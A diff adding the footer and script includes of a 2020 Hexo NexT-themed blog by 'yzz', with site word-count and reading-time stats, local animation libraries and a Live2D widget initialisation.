+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yzz</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">286k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:20</span>
+</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
